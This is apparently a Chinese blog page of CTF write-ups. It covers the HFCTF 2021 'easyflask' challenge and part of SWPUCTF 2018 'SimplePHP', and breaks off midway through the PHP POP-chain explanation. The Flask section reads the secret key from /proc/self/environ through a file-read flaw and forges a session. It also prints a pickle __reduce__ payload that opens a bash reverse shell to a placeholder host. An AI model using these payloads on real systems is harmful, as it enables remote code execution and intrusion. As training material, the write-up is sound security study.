

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="Yu ting">
  <meta name="keywords" content="">
  <title>buu（四） - liquor&#39;s blog</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
  



<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.2.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="buu（四）">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-07-30 00:16" pubdate>
        July 30, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.1k 字
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      35
       分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">buu（四）</h1>
            
            <div class="markdown-body">
              <h1>[HFCTF 2021 Final]easyflask</h1>
<p>任意文件读取，根据提示读取源码</p>
<pre><code class="hljs lua">#!/usr/bin/python3<span class="hljs-number">.6</span>
import <span class="hljs-built_in">os</span>
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.<span class="hljs-built_in">config</span>[<span class="hljs-string">&quot;SECRET_KEY&quot;</span>] = <span class="hljs-string">&quot;*******&quot;</span>

User = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (object,), &#123;
    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;test&#x27;</span>,
    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,
    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,
&#125;)


@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))
def index_handler():
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):
        u = pickle.dumps(User())
        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u
    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span>


@app.route(<span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))
def file_handler():
    <span class="hljs-built_in">path</span> = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)
    <span class="hljs-built_in">path</span> = <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.join(<span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-built_in">path</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.exists(<span class="hljs-built_in">path</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">os</span>.<span class="hljs-built_in">path</span>.isdir(<span class="hljs-built_in">path</span>) \
            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">path</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span>

    with <span class="hljs-built_in">open</span>(<span class="hljs-built_in">path</span>, <span class="hljs-string">&#x27;r&#x27;</span>) as fp:
        content = fp.<span class="hljs-built_in">read</span>()
    <span class="hljs-keyword">return</span> content


@app.route(<span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-string">&#x27;GET&#x27;</span>,))
def admin_handler():
    try:
        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)
        <span class="hljs-keyword">if</span> isinstance(u, dict):#如果u对应的值是字典，会读取  u.b
            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))
        u = pickle.loads(u)#pickle反序列化
    except Exception:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span>

    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>, <span class="hljs-built_in">debug</span>=False)</code></pre>
<p><code>/file</code> 路由，用户上传的 path 会被拼接到 static 目录后面，这里有个trick，当 os.path.join 的第二个参数为绝对路径时拼接的结果就是该绝对路径,可实现任意文件读取。此处对参数做了一些限制。</p>
<img src="/2021/07/30/black/1.png" srcset="/img/loading.gif" alt="1" style="zoom:67%;">
<p><code>/admin</code> 路由里使用 pickle 模块直接将 session 里的内容反序列化，反序列化必然包含创建新对象的操作，如果 <code>__reduce__</code> 里包含攻击代码就可以实现RCE，反序列化的输出储存在 session 里，但是 session 数据都是 flask 加密过的，只有知道 secret_key 才能伪造 session 实现 RCE。利用伪文件系统 <code>/proc</code>，结合前面的任意文件读取漏洞可以读取到自身的环境变量，即<code>/file?file=/proc/self/environ</code>，得到<code>secret_key</code>。</p>
<p><img src="/2021/07/30/black/2.png" srcset="/img/loading.gif" alt="2"></p>
<h4 id="tips-Flask-session身份伪造"><a class="header-anchor" href="#tips-Flask-session身份伪造">🍭</a>tips:Flask-session身份伪造</h4>
<p>flask是把session存在客户端的，而且只经过base64编码和用密钥签名，虽然没有有签名不可以伪造session，但是有很多信息我们可以直接从session解码找出来。</p>
<p>如一串 <strong>session</strong> 值为： <strong>eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY</strong> ，解密：</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> *
s = &quot;eyJ1c2VyX2lkIjo2fQ.XA3a4A.R-ReVnWT8pkpFqM_52MabkZYIkY&quot;
data,<span class="hljs-type">timestamp</span>,secret = s.split(<span class="hljs-string">&#x27;.&#x27;</span>)
<span class="hljs-type">int</span>.from_bytes(base64_decode(<span class="hljs-type">timestamp</span>),byteorder=<span class="hljs-string">&#x27;big&#x27;</span>)</code></pre>
<p><img src="/2021/07/30/black/6.png" srcset="/img/loading.gif" alt="6"></p>
<p>即可获取信息。</p>
<p>flask解密脚本：</p>
<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> zlib
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode
<span class="hljs-keyword">from</span> flask.sessions <span class="hljs-keyword">import</span> session_json_serializer
<span class="hljs-keyword">from</span> itsdangerous <span class="hljs-keyword">import</span> base64_decode

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decryption</span>(<span class="hljs-params">payload</span>):</span>
    payload, sig = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)
    payload, timestamp = payload.rsplit(<span class="hljs-string">b&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)

    decompress = <span class="hljs-literal">False</span>
    <span class="hljs-keyword">if</span> payload.startswith(<span class="hljs-string">b&#x27;.&#x27;</span>):
        payload = payload[<span class="hljs-number">1</span>:]
        decompress = <span class="hljs-literal">True</span>

    <span class="hljs-keyword">try</span>:
        payload = base64_decode(payload)
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not base64 decode the payload because of &#x27;</span>
                        <span class="hljs-string">&#x27;an exception&#x27;</span>)

    <span class="hljs-keyword">if</span> decompress:
        <span class="hljs-keyword">try</span>:
            payload = zlib.decompress(payload)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not zlib decompress the payload before &#x27;</span>
                            <span class="hljs-string">&#x27;decoding the payload&#x27;</span>)

    <span class="hljs-keyword">return</span> session_json_serializer.loads(payload)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    print(decryption(<span class="hljs-string">&quot;session值&quot;</span>.encode()))</code></pre>
<p>FLASK加密脚本：<br>
<a target="_blank" rel="noopener" href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p>
<p>开始伪造session：（利用反弹shell构造的简单反序列化）</p>
<pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode
<span class="hljs-keyword">import</span> os

<span class="hljs-keyword">User</span> = <span class="hljs-keyword">type</span>(<span class="hljs-string">&#x27;User&#x27;</span>, (<span class="hljs-keyword">object</span>,), &#123;
    <span class="hljs-string">&#x27;uname&#x27;</span>: <span class="hljs-string">&#x27;tyskill&#x27;</span>,
    <span class="hljs-string">&#x27;is_admin&#x27;</span>: <span class="hljs-number">0</span>,
    <span class="hljs-string">&#x27;__repr__&#x27;</span>: lambda o: o.uname,
    <span class="hljs-string">&#x27;__reduce__&#x27;</span>: lambda o: (os.<span class="hljs-keyword">system</span>, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1&#x27;&quot;,))
&#125;)
u = pickle.dumps(<span class="hljs-keyword">User</span>())
print(b64encode(u).decode())
//win和linux下dumps的结果中序列化字符串声明系统的标识符不同：Linux=&gt;posix；Windows=&gt;nt，需要将脚本放在Linux环境下生成序列化字符串</code></pre>
<p>执行</p>
<p><img src="/2021/07/30/black/4.png" srcset="/img/loading.gif" alt="4"></p>
<p>加密：</p>
<p><img src="/2021/07/30/black/5.png" srcset="/img/loading.gif" alt="5"></p>
<p>替换掉session，用靶机监听即可RCE。</p>
<p>参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/117422046">https://blog.csdn.net/LYJ20010728/article/details/117422046</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3569#toc-0">https://xz.aliyun.com/t/3569#toc-0</a></p>
<h1>[SWPUCTF 2018]SimplePHP</h1>
<p>查看文件页面可以直接读取文件内容</p>
<p>file.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; 
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; 
ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); 
$file = $_GET[<span class="hljs-string">&quot;file&quot;</span>] ? $_GET[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; 
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($file)) &#123; 
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; 
&#125; 
$show = <span class="hljs-keyword">new</span> Show(); 
<span class="hljs-keyword">if</span>(file_exists($file)) &#123; 
    $show-&gt;source = $file; 
    $show-&gt;_show(); 
&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($file))&#123; 
    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); 
&#125; 
<span class="hljs-meta">?&gt;</span></code></pre>
<p>file_exists判断file参数的文件是否存在，故伪协议不能用。若文件存在，将要读取的文件赋值给Show类的$source。调用_show()，这个函数在class.php中</p>
<pre><code class="hljs reasonml">public <span class="hljs-keyword">function</span> <span class="hljs-constructor">_show()</span>&#123;
    <span class="hljs-keyword">if</span>(preg<span class="hljs-constructor">_match(&#x27;<span class="hljs-operator">/</span><span class="hljs-params">http</span>|<span class="hljs-params">https</span>|<span class="hljs-params">file</span>:|<span class="hljs-params">gopher</span>|<span class="hljs-params">dict</span>|\.\.|<span class="hljs-params">f1ag</span><span class="hljs-operator">/</span><span class="hljs-params">i</span>&#x27;,$<span class="hljs-params">this</span>-&gt;<span class="hljs-params">source</span>)</span>) &#123;
        die(&#x27;hacker!&#x27;);
    &#125; <span class="hljs-keyword">else</span>&#123;
            highlight<span class="hljs-constructor">_file($<span class="hljs-params">this</span>-&gt;<span class="hljs-params">source</span>)</span>;
    &#125;      
&#125;</code></pre>
<p>传入的文件名正则过滤，绕过就读取源码；总结读取流程：文件名==&gt;file_exists==正则过滤==&gt;读取</p>
<p>function.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
<span class="hljs-comment">//show_source(__FILE__); </span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; 
header(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); 
error_reporting(<span class="hljs-number">0</span>); 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; 
    <span class="hljs-keyword">global</span> $_FILES; 
    $filename = md5($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].$_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; 
    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span>
    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-string">&quot;upload/&quot;</span> . $filename)) &#123; 
        unlink($filename); 
    &#125; 
    move_uploaded_file($_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . $filename); 
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; 
    <span class="hljs-keyword">global</span> $_FILES; 
    <span class="hljs-keyword">if</span>(upload_file_check()) &#123; 
        upload_file_do(); 
    &#125; 
&#125; 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; 
    <span class="hljs-keyword">global</span> $_FILES; 
    $allowed_types = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); 
    $temp = explode(<span class="hljs-string">&quot;.&quot;</span>,$_FILES[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); 
    $extension = end($temp); 
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($extension)) &#123; 
        <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span>
    &#125; 
    <span class="hljs-keyword">else</span>&#123; 
        <span class="hljs-keyword">if</span>(in_array($extension,$allowed_types)) &#123; 
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; 
        &#125; 
        <span class="hljs-keyword">else</span> &#123; 
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; 
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; 
        &#125; 
    &#125; 
&#125; 
<span class="hljs-meta">?&gt;</span></code></pre>
<p>调用upload_file函数。 <code>upload_file_check()：判断文件后缀名，必须是gif/jpeg/jpg/png</code> ==&gt;<code>upload_file_do() 上传文件;文件名=md5(文件名+IP地址)</code></p>
<p>序列化，无unserialize()，文件上传，phar协议未过滤，应该要phar反序列化。</p>
<p>class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $test;
    <span class="hljs-keyword">public</span> $str;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;str = $name;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;
        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $source;
    <span class="hljs-keyword">public</span> $str;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;source = $file;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;source;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        $content = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;
        <span class="hljs-keyword">return</span> $content;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params">$key,$value</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;$key = $value;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-keyword">$this</span>-&gt;source)) &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);
        &#125; <span class="hljs-keyword">else</span> &#123;
            highlight_file(<span class="hljs-keyword">$this</span>-&gt;source);
        &#125;
        
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;
            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;
        &#125;
    &#125;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $file;
    <span class="hljs-keyword">public</span> $params;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$key</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[$key])) &#123;
            $value = <span class="hljs-keyword">$this</span>-&gt;params[$key];
        &#125; <span class="hljs-keyword">else</span> &#123;
            $value = <span class="hljs-string">&quot;index.php&quot;</span>;
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get($value);
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params">$value</span>)</span>
<span class="hljs-function">    </span>&#123;
        $text = base64_encode(file_get_contents($value));
        <span class="hljs-keyword">return</span> $text;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<h4 id="POP链构造"><a class="header-anchor" href="#POP链构造">🍭</a>POP链构造</h4>
<h5 id="destruct"><a class="header-anchor" href="#destruct">🍭</a>__destruct()</h5>
<p>__destruct()是PHP中的析构方法，在对象被销毁时被调用，程序结束时会被自动调用销毁对象。函数中发现了echo，那么要利用echo $this-&gt;test。(我习惯从destruct入手)</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;
        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;
&#125;</code></pre>
<h5 id="toString"><a class="header-anchor" href="#toString">🍭</a>__toString(),</h5>
<p>__toString方法在将一个对象转化成字符串时被自动调用，比如进行echo，print操作时会被调用并返回一个字符串。利用$this-&gt;str[‘str’]-&gt;source;</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
        $content = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;
        <span class="hljs-keyword">return</span> $content;
&#125;</code></pre>
<h5 id="get（）"><a class="header-anchor" href="#get（）">🍭</a>__get（）</h5>
<p>__get（）当未定义的属性或没有权限访问的属性被访问时该方法会被调用。</p>
<p>利用 <code>$this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>
<span class="hljs-function"></span>&#123;
		<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);
		
&#125;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$key</span>)</span>
<span class="hljs-function"></span>&#123;
       <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[$key])) &#123;
            $value = <span class="hljs-keyword">$this</span>-&gt;params[$key];
		&#125; <span class="hljs-keyword">else</span> &#123;
            $value = <span class="hljs-string">&quot;index.php&quot;</span>;
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get($value);
&#125;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params">$value</span>)</span>
<span class="hljs-function"></span>&#123;
       $text = base64_encode(file_get_contents($value));
       <span class="hljs-keyword">return</span> $text;
&#125;</code></pre>
<p>调用了file_get_contents，pop链的结束。</p>
<p>思路：<code>C1e4r::destruct() --&gt; Show::toString() --&gt; Test::__get() </code></p>
<p>Cle4r: 将str赋值为Show类,<code> this-&gt;test=$this-&gt;Show echo $this-&gt;test;</code> 触发Show类中的<code>__tostring</code>魔术方法</p>
<p>==&gt;Show: 执行 <code>$content=$this-&gt;str['str']-&gt;source; </code>将str[‘str’]赋值为Test类,使其调用source。</p>
